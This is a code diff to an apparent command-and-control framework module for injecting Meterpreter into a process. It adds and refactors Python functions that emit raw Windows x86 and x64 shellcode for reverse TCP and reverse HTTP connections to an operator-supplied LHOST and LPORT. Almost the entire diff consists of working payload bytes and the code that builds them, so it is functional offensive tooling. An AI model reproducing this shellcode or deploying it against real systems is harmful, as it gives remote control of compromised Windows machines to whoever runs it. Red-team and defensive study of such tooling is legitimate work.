@@ -13,7 +13,7 @@ class MeterpreterArguments(TaskArguments):
         self.args = {
             "pid": CommandParameter(name="PID", type=ParameterType.Number),
             "payload_type": CommandParameter(name="Payload Type", type=ParameterType.ChooseOne, choices=self.VALID_PAYLOAD_TYPES),
-            "arch": CommandParameter(name="Architecture (x86/x64)", type=ParameterType.ChooseOne, choices=self.VALID_ARCHITECTURES),
+            "arch": CommandParameter(name="Architecture", type=ParameterType.ChooseOne, choices=self.VALID_ARCHITECTURES),
             "lhost": CommandParameter(name="LHOST", type=ParameterType.String),
             "lport": CommandParameter(name="LPORT", type=ParameterType.Number)
         }
@@ -31,7 +31,7 @@ class MeterpreterArguments(TaskArguments):
 
         # Verify payload type
         if self.get_arg("payload_type") is None or self.get_arg("payload_type").lower() not in self.VALID_PAYLOAD_TYPES:
-            raise Exception("Invalid Architecture Type. Choices: reverse_tcp, reverse_http, reverse_https")
+            raise Exception("Invalid Payload Type. Choices: reverse_tcp, reverse_http, reverse_https")
 
 
 class MeterpreterCommand(CommandBase):
@@ -72,7 +72,10 @@ class MeterpreterCommand(CommandBase):
                 resp = await MythicFileRPC(task).register_file(
                     build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))
-
+            if task.args.get_arg("payload_type").lower() == "reverse_http":
+                resp = await MythicFileRPC(task).register_file(
+                    build_meterpreter_reverse_http_86(task.args.get_arg("lhost"),
+                                                     task.args.get_arg("lport")))
 
         # Remove args that are unused by remote agent
         task.args.remove_arg("lhost")
@@ -92,13 +95,19 @@ class MeterpreterCommand(CommandBase):
         pass
 
 
+def get_hex_ip(IP):
+    return bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
+
+###
+# x64 Payloads
+###
+
+
 def build_meterpreter_reverse_tcp_64(IP, port):
     """
     Generate shellcode for windows/x64/meterpreter/reverse_tcp
 
     """
-    hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
-    hex_port = port.to_bytes(2, 'big')
 
     buf = b""
     buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
@@ -121,10 +130,10 @@ def build_meterpreter_reverse_tcp_64(IP, port):
     buf += b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0"
     buf += b"\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00"
     # PORT
-    buf += hex_port
+    buf += port.to_bytes(2, 'big')
 
     # IP
-    buf += hex_ip
+    buf += get_hex_ip(IP)
 
     buf += b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba"
     buf += b"\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00"
@@ -151,13 +160,16 @@ def build_meterpreter_reverse_tcp_64(IP, port):
     return buf
 
 
+###
+# x86 Payloads
+###
+
+
 def build_meterpreter_reverse_tcp_86(IP, port):
     """
     Generate shellcode for windows/meterpreter/reverse_tcp
 
     """
-    hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
-    hex_port = port.to_bytes(2, 'big')
 
     buf = b""
     buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
@@ -175,9 +187,9 @@ def build_meterpreter_reverse_tcp_86(IP, port):
     buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
     buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
     buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68"
-    buf += hex_ip
+    buf += get_hex_ip(IP)
     buf += b"\x68\x02\x00"
-    buf += hex_port
+    buf += port.to_bytes(2, 'big')
     buf += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
     buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
     buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
@@ -191,5 +203,54 @@ def build_meterpreter_reverse_tcp_86(IP, port):
     buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
     buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
     buf += b"\x53\xff\xd5"
+
+    return buf
+
+
+def build_meterpreter_reverse_http_86(IP, port):
+    buf = b""
+    buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30"
+    buf += b"\x8b\x52\x0c\x8b\x52\x14\x89\xe5\x8b\x72\x28\x31\xff"
+    buf += b"\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
+    buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10"
+    buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
+    buf += b"\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3\x85\xc9\x74"
+    buf += b"\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac\xc1"
+    buf += b"\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
+    buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
+    buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
+    buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74\x00\x68"
+    buf += b"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31"
+    buf += b"\xdb\x53\x53\x53\x53\x53\xe8\x3e\x00\x00\x00\x4d\x6f"
+    buf += b"\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69"
+    buf += b"\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b"
+    buf += b"\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b"
+    buf += b"\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b"
+    buf += b"\x65\x20\x47\x65\x63\x6b\x6f\x00\x68\x3a\x56\x79\xa7"
+    buf += b"\xff\xd5\x53\x53\x6a\x03\x53\x53\x68"
+    buf += port.to_bytes(2, 'little')
+    buf += b"\x00\x00"
+    buf += b"\xe8\xdc\x00\x00\x00\x2f\x62\x30\x47\x6e\x47\x42\x31"
+    buf += b"\x41\x6a\x57\x4f\x49\x65\x34\x6c\x36\x31\x38\x39\x2d"
+    buf += b"\x6e\x41\x39\x66\x6c\x70\x43\x6e\x41\x32\x71\x51\x51"
+    buf += b"\x56\x6f\x73\x6c\x35\x4f\x32\x6b\x39\x43\x68\x66\x73"
+    buf += b"\x37\x6b\x57\x73\x5f\x73\x30\x47\x31\x61\x49\x41\x68"
+    buf += b"\x66\x44\x77\x43\x2d\x37\x51\x54\x51\x37\x45\x79\x4c"
+    buf += b"\x6c\x71\x79\x33\x61\x72\x66\x63\x4b\x45\x2d\x5f\x58"
+    buf += b"\x38\x2d\x52\x51\x53\x6b\x52\x65\x4d\x39\x00\x50\x68"
+    buf += b"\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x02\x68"
+    buf += b"\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff"
+    buf += b"\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68\x2d\x06"
+    buf += b"\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88\x13\x00\x00"
+    buf += b"\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xe1\xe8\x4b\x00"
+    buf += b"\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40"
+    buf += b"\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89"
+    buf += b"\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89"
+    buf += b"\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0"
+    buf += b"\x75\xe5\x58\xc3\x5f\xe8\x7f\xff\xff\xff"
+    buf += IP.encode()
+    buf += b"\x00\xbb"
+    buf += b"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
 
     return buf
